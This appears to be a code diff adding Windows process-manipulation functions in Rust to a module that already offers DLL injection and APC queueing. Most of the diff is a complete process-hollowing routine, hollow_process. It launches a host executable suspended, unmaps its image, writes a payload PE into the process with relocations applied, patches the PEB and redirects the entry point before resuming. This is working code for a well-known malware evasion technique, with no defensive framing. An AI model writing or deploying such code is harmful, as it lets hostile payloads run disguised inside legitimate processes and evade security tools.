@@ -4,10 +4,13 @@ use std::ffi::CString;
 use std::fmt;
 use std::path::Path;
 
+use ntapi::ntpsapi::{NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION};
+use ntapi::ntmmapi::NtUnmapViewOfSection;
 use windows::core::PCSTR;
-use windows::Win32::Foundation::CloseHandle;
+use windows::Win32::Foundation::{CloseHandle, HANDLE};
 use windows::Win32::System::Diagnostics::Debug::{
-    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL_AMD64,
+    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
+    CONTEXT_FULL_AMD64,
 };
 use windows::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
@@ -18,10 +21,11 @@ use windows::Win32::System::Memory::{
     PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
 };
 use windows::Win32::System::Threading::{
-    CreateRemoteThread, OpenProcess, OpenThread, QueueUserAPC, ResumeThread, SuspendThread,
-    WaitForSingleObject, PROCESS_ALL_ACCESS, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
-    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT,
-    THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
+    CreateProcessW, CreateRemoteThread, OpenProcess, OpenThread, QueueUserAPC, ResumeThread,
+    SuspendThread, TerminateProcess, WaitForSingleObject, CREATE_SUSPENDED, PROCESS_ALL_ACCESS,
+    PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+    PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT,
+    THREAD_SUSPEND_RESUME,
 };
 
 /// Errors that can occur during misc operations.
@@ -31,6 +35,7 @@ pub enum MiscError {
     OpenProcessFailed(u32),
     AllocFailed,
     WriteFailed,
+    ReadFailed,
     GetModuleHandleFailed,
     GetProcAddressFailed,
     CreateRemoteThreadFailed,
@@ -49,15 +54,21 @@ pub enum MiscError {
     DecommitFailed(String),
     FreeFailed(String),
     QueueApcFailed,
+    CreateProcessFailed(String),
+    NtQueryFailed,
+    NtUnmapFailed,
+    PebReadFailed,
+    ArchMismatch(String),
 }
 
 impl fmt::Display for MiscError {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            MiscError::FileNotFound(path) => write!(f, "DLL file not found: {}", path),
+            MiscError::FileNotFound(path) => write!(f, "File not found: {}", path),
             MiscError::OpenProcessFailed(pid) => write!(f, "Failed to open process {}", pid),
             MiscError::AllocFailed => write!(f, "Failed to allocate memory in target process"),
             MiscError::WriteFailed => write!(f, "Failed to write to target process memory"),
+            MiscError::ReadFailed => write!(f, "Failed to read from target process memory"),
             MiscError::GetModuleHandleFailed => write!(f, "Failed to get kernel32.dll handle"),
             MiscError::GetProcAddressFailed => write!(f, "Failed to get LoadLibraryW address"),
             MiscError::CreateRemoteThreadFailed => write!(f, "Failed to create remote thread"),
@@ -82,6 +93,11 @@ impl fmt::Display for MiscError {
             MiscError::QueueApcFailed => {
                 write!(f, "Failed to queue APC on any thread in target process")
             }
+            MiscError::CreateProcessFailed(msg) => write!(f, "Failed to create process: {}", msg),
+            MiscError::NtQueryFailed => write!(f, "NtQueryInformationProcess failed"),
+            MiscError::NtUnmapFailed => write!(f, "NtUnmapViewOfSection failed"),
+            MiscError::PebReadFailed => write!(f, "Failed to read/write PEB"),
+            MiscError::ArchMismatch(msg) => write!(f, "Architecture mismatch: {}", msg),
         }
     }
 }
@@ -1277,5 +1293,517 @@ pub fn free_memory(pid: u32, allocation_base: usize) -> Result<(), MiscError> {
                 allocation_base, e
             ))
         })
+    }
+}
+
+/// Create a new process using CreateProcessW.
+///
+/// Returns (pid, thread_id) on success.
+///
+/// # Arguments
+/// * `exe_path` - Path to the executable
+/// * `args` - Command line arguments (can be empty)
+/// * `suspended` - If true, creates the process in a suspended state
+pub fn create_process(exe_path: &str, args: &str, suspended: bool) -> Result<(u32, u32), MiscError> {
+    // Validate executable exists
+    if !Path::new(exe_path).exists() {
+        return Err(MiscError::FileNotFound(exe_path.to_string()));
+    }
+
+    // Build command line: "exe_path" args
+    let cmd_line = if args.is_empty() {
+        format!("\"{}\"", exe_path)
+    } else {
+        format!("\"{}\" {}", exe_path, args)
+    };
+
+    // Convert to wide string (UTF-16)
+    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
+
+    unsafe {
+        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
+        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+
+        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
+
+        let creation_flags = if suspended { CREATE_SUSPENDED } else { Default::default() };
+
+        let result = CreateProcessW(
+            None,                           // lpApplicationName
+            windows::core::PWSTR(cmd_wide.as_mut_ptr()), // lpCommandLine
+            None,                           // lpProcessAttributes
+            None,                           // lpThreadAttributes
+            false,                          // bInheritHandles
+            creation_flags,                 // dwCreationFlags
+            None,                           // lpEnvironment
+            None,                           // lpCurrentDirectory
+            &startup_info,                  // lpStartupInfo
+            &mut process_info,              // lpProcessInformation
+        );
+
+        if result.is_err() {
+            return Err(MiscError::CreateProcessFailed(format!(
+                "CreateProcessW failed for {}",
+                exe_path
+            )));
+        }
+
+        let pid = process_info.dwProcessId;
+        let tid = process_info.dwThreadId;
+
+        // Close handles (we don't need them)
+        let _ = CloseHandle(process_info.hThread);
+        let _ = CloseHandle(process_info.hProcess);
+
+        Ok((pid, tid))
+    }
+}
+
+/// Perform process hollowing: create a host process suspended, replace its image with a payload PE, then resume.
+///
+/// Returns the PID of the hollowed process on success.
+///
+/// # Arguments
+/// * `host_path` - Path to the host executable (will be hollowed)
+/// * `payload_path` - Path to the payload PE to inject
+pub fn hollow_process(host_path: &str, payload_path: &str) -> Result<u32, MiscError> {
+    // Validate both files exist
+    if !Path::new(host_path).exists() {
+        return Err(MiscError::FileNotFound(host_path.to_string()));
+    }
+    if !Path::new(payload_path).exists() {
+        return Err(MiscError::FileNotFound(payload_path.to_string()));
+    }
+
+    // Read payload PE file
+    let data = std::fs::read(payload_path)
+        .map_err(|_| MiscError::FileReadFailed(payload_path.to_string()))?;
+
+    // Parse DOS header
+    if data.len() < 64 {
+        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
+    }
+    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
+    if dos_magic != 0x5A4D {
+        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
+    }
+    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
+
+    // Parse PE signature
+    if data.len() < pe_offset + 4 {
+        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
+    }
+    let pe_sig = u32::from_le_bytes([
+        data[pe_offset],
+        data[pe_offset + 1],
+        data[pe_offset + 2],
+        data[pe_offset + 3],
+    ]);
+    if pe_sig != 0x00004550 {
+        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
+    }
+
+    // COFF header
+    let coff_offset = pe_offset + 4;
+    if data.len() < coff_offset + 20 {
+        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
+    }
+    let num_sections = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
+    let optional_header_size =
+        u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;
+
+    // Optional header
+    let opt_offset = coff_offset + 20;
+    if data.len() < opt_offset + 2 {
+        return Err(MiscError::InvalidPE("File too small for optional header".into()));
+    }
+    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
+    if opt_magic != 0x20b {
+        return Err(MiscError::ArchMismatch(
+            "Only PE32+ (64-bit) executables are supported".into(),
+        ));
+    }
+
+    // PE32+ optional header fields
+    if data.len() < opt_offset + 112 {
+        return Err(MiscError::InvalidPE("Optional header too small".into()));
+    }
+
+    let entry_point_rva = u32::from_le_bytes([
+        data[opt_offset + 16],
+        data[opt_offset + 17],
+        data[opt_offset + 18],
+        data[opt_offset + 19],
+    ]) as usize;
+
+    let image_base = u64::from_le_bytes([
+        data[opt_offset + 24],
+        data[opt_offset + 25],
+        data[opt_offset + 26],
+        data[opt_offset + 27],
+        data[opt_offset + 28],
+        data[opt_offset + 29],
+        data[opt_offset + 30],
+        data[opt_offset + 31],
+    ]);
+
+    let size_of_image = u32::from_le_bytes([
+        data[opt_offset + 56],
+        data[opt_offset + 57],
+        data[opt_offset + 58],
+        data[opt_offset + 59],
+    ]) as usize;
+
+    let size_of_headers = u32::from_le_bytes([
+        data[opt_offset + 60],
+        data[opt_offset + 61],
+        data[opt_offset + 62],
+        data[opt_offset + 63],
+    ]) as usize;
+
+    // Base relocation directory: index 5 (offset 112 + 5*8 = 152)
+    let reloc_dir_rva;
+    let reloc_dir_size;
+    if data.len() >= opt_offset + 160 {
+        reloc_dir_rva = u32::from_le_bytes([
+            data[opt_offset + 152],
+            data[opt_offset + 153],
+            data[opt_offset + 154],
+            data[opt_offset + 155],
+        ]) as usize;
+        reloc_dir_size = u32::from_le_bytes([
+            data[opt_offset + 156],
+            data[opt_offset + 157],
+            data[opt_offset + 158],
+            data[opt_offset + 159],
+        ]) as usize;
+    } else {
+        reloc_dir_rva = 0;
+        reloc_dir_size = 0;
+    }
+
+    // Parse section headers
+    let sections_offset = opt_offset + optional_header_size;
+
+    #[allow(dead_code)]
+    struct SectionInfo {
+        virtual_address: usize,
+        virtual_size: usize,
+        raw_data_offset: usize,
+        raw_data_size: usize,
+    }
+
+    let mut sections = Vec::new();
+    for i in 0..num_sections {
+        let s_off = sections_offset + i * 40;
+        if data.len() < s_off + 40 {
+            break;
+        }
+        let virtual_size = u32::from_le_bytes([
+            data[s_off + 8],
+            data[s_off + 9],
+            data[s_off + 10],
+            data[s_off + 11],
+        ]) as usize;
+        let virtual_address = u32::from_le_bytes([
+            data[s_off + 12],
+            data[s_off + 13],
+            data[s_off + 14],
+            data[s_off + 15],
+        ]) as usize;
+        let raw_data_size = u32::from_le_bytes([
+            data[s_off + 16],
+            data[s_off + 17],
+            data[s_off + 18],
+            data[s_off + 19],
+        ]) as usize;
+        let raw_data_offset = u32::from_le_bytes([
+            data[s_off + 20],
+            data[s_off + 21],
+            data[s_off + 22],
+            data[s_off + 23],
+        ]) as usize;
+        sections.push(SectionInfo {
+            virtual_address,
+            virtual_size,
+            raw_data_offset,
+            raw_data_size,
+        });
+    }
+
+    // Build command line for host process
+    let cmd_line = format!("\"{}\"", host_path);
+    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
+
+    unsafe {
+        // Create host process SUSPENDED
+        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
+        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+
+        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
+
+        let result = CreateProcessW(
+            None,
+            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
+            None,
+            None,
+            false,
+            CREATE_SUSPENDED,
+            None,
+            None,
+            &startup_info,
+            &mut process_info,
+        );
+
+        if result.is_err() {
+            return Err(MiscError::CreateProcessFailed(format!(
+                "CreateProcessW failed for host {}",
+                host_path
+            )));
+        }
+
+        let process_handle = process_info.hProcess;
+        let thread_handle = process_info.hThread;
+        let pid = process_info.dwProcessId;
+
+        // Helper to clean up on error
+        let cleanup = |ph: HANDLE, th: HANDLE| {
+            let _ = TerminateProcess(ph, 1);
+            let _ = CloseHandle(th);
+            let _ = CloseHandle(ph);
+        };
+
+        // Query PEB address via NtQueryInformationProcess
+        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
+        let mut return_length: u32 = 0;
+
+        let status = NtQueryInformationProcess(
+            process_handle.0 as *mut _,
+            ProcessBasicInformation,
+            &mut pbi as *mut _ as *mut _,
+            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+            &mut return_length,
+        );
+
+        if status != 0 {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::NtQueryFailed);
+        }
+
+        let peb_address = pbi.PebBaseAddress as u64;
+
+        // Read original image base from PEB (offset 0x10 on x64 = ImageBaseAddress)
+        let mut original_image_base: u64 = 0;
+        let peb_image_base_offset = peb_address + 0x10;
+
+        if ReadProcessMemory(
+            process_handle,
+            peb_image_base_offset as *const _,
+            &mut original_image_base as *mut _ as *mut _,
+            8,
+            None,
+        )
+        .is_err()
+        {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::PebReadFailed);
+        }
+
+        // Unmap original image via NtUnmapViewOfSection
+        let unmap_status = NtUnmapViewOfSection(
+            process_handle.0 as *mut _,
+            original_image_base as *mut _,
+        );
+
+        if unmap_status != 0 {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::NtUnmapFailed);
+        }
+
+        // Allocate memory at payload's preferred image_base
+        let mut allocated_base = VirtualAllocEx(
+            process_handle,
+            Some(image_base as *const _),
+            size_of_image,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        // If allocation at preferred base fails, allocate at any address
+        if allocated_base.is_null() {
+            allocated_base = VirtualAllocEx(
+                process_handle,
+                None,
+                size_of_image,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            );
+        }
+
+        if allocated_base.is_null() {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::AllocFailed);
+        }
+
+        let actual_base = allocated_base as u64;
+
+        // Build mapped image in local buffer
+        let mut image = vec![0u8; size_of_image];
+
+        // Copy PE headers
+        let header_copy_len = size_of_headers.min(data.len()).min(size_of_image);
+        image[..header_copy_len].copy_from_slice(&data[..header_copy_len]);
+
+        // Map each section
+        for section in &sections {
+            if section.raw_data_size == 0 || section.raw_data_offset == 0 {
+                continue;
+            }
+            let src_start = section.raw_data_offset;
+            let src_end = (src_start + section.raw_data_size).min(data.len());
+            let dst_start = section.virtual_address;
+            let copy_len = (src_end - src_start).min(size_of_image.saturating_sub(dst_start));
+            if copy_len > 0 && dst_start < size_of_image {
+                image[dst_start..dst_start + copy_len]
+                    .copy_from_slice(&data[src_start..src_start + copy_len]);
+            }
+        }
+
+        // Apply base relocations if needed
+        let delta = actual_base.wrapping_sub(image_base) as i64;
+        if reloc_dir_rva != 0 && reloc_dir_size != 0 && delta != 0 {
+            let mut reloc_offset = reloc_dir_rva;
+            let reloc_end = reloc_dir_rva + reloc_dir_size;
+
+            while reloc_offset + 8 <= reloc_end && reloc_offset + 8 <= size_of_image {
+                let block_rva = u32::from_le_bytes([
+                    image[reloc_offset],
+                    image[reloc_offset + 1],
+                    image[reloc_offset + 2],
+                    image[reloc_offset + 3],
+                ]) as usize;
+                let block_size = u32::from_le_bytes([
+                    image[reloc_offset + 4],
+                    image[reloc_offset + 5],
+                    image[reloc_offset + 6],
+                    image[reloc_offset + 7],
+                ]) as usize;
+
+                if block_size < 8 {
+                    break;
+                }
+
+                let num_entries = (block_size - 8) / 2;
+                for i in 0..num_entries {
+                    let entry_offset = reloc_offset + 8 + i * 2;
+                    if entry_offset + 2 > size_of_image {
+                        break;
+                    }
+                    let entry = u16::from_le_bytes([image[entry_offset], image[entry_offset + 1]]);
+                    let reloc_type = (entry >> 12) as u8;
+                    let offset = (entry & 0x0FFF) as usize;
+                    let target = block_rva + offset;
+
+                    match reloc_type {
+                        10 => {
+                            // IMAGE_REL_BASED_DIR64
+                            if target + 8 <= size_of_image {
+                                let val = u64::from_le_bytes([
+                                    image[target],
+                                    image[target + 1],
+                                    image[target + 2],
+                                    image[target + 3],
+                                    image[target + 4],
+                                    image[target + 5],
+                                    image[target + 6],
+                                    image[target + 7],
+                                ]);
+                                let new_val = (val as i64).wrapping_add(delta) as u64;
+                                image[target..target + 8].copy_from_slice(&new_val.to_le_bytes());
+                            }
+                        }
+                        3 => {
+                            // IMAGE_REL_BASED_HIGHLOW
+                            if target + 4 <= size_of_image {
+                                let val = u32::from_le_bytes([
+                                    image[target],
+                                    image[target + 1],
+                                    image[target + 2],
+                                    image[target + 3],
+                                ]);
+                                let new_val = (val as i32).wrapping_add(delta as i32) as u32;
+                                image[target..target + 4].copy_from_slice(&new_val.to_le_bytes());
+                            }
+                        }
+                        0 => {} // IMAGE_REL_BASED_ABSOLUTE - padding, skip
+                        _ => {}
+                    }
+                }
+
+                reloc_offset += block_size;
+            }
+        }
+
+        // Write mapped image to remote process
+        if WriteProcessMemory(
+            process_handle,
+            allocated_base,
+            image.as_ptr() as *const _,
+            size_of_image,
+            None,
+        )
+        .is_err()
+        {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::WriteFailed);
+        }
+
+        // Update PEB ImageBaseAddress to new base
+        if WriteProcessMemory(
+            process_handle,
+            peb_image_base_offset as *mut _,
+            &actual_base as *const _ as *const _,
+            8,
+            None,
+        )
+        .is_err()
+        {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::PebReadFailed);
+        }
+
+        // Get thread context
+        let mut context: CONTEXT = std::mem::zeroed();
+        context.ContextFlags = CONTEXT_FULL_AMD64;
+
+        if GetThreadContext(thread_handle, &mut context).is_err() {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::GetContextFailed);
+        }
+
+        // Update RCX register to new entry point (for x64, entry point address goes in RCX)
+        // Actually for process creation, the entry point is typically in RCX at start
+        // But we should update Rcx to point to the new entry point
+        let new_entry_point = actual_base + entry_point_rva as u64;
+        context.Rcx = new_entry_point;
+
+        // Set thread context
+        if SetThreadContext(thread_handle, &context).is_err() {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::SetContextFailed);
+        }
+
+        // Resume thread
+        let resume_result = ResumeThread(thread_handle);
+        if resume_result == u32::MAX {
+            cleanup(process_handle, thread_handle);
+            return Err(MiscError::ResumeThreadFailed(process_info.dwThreadId));
+        }
+
+        // Close handles
+        let _ = CloseHandle(thread_handle);
+        let _ = CloseHandle(process_handle);
+
+        Ok(pid)
     }
 }
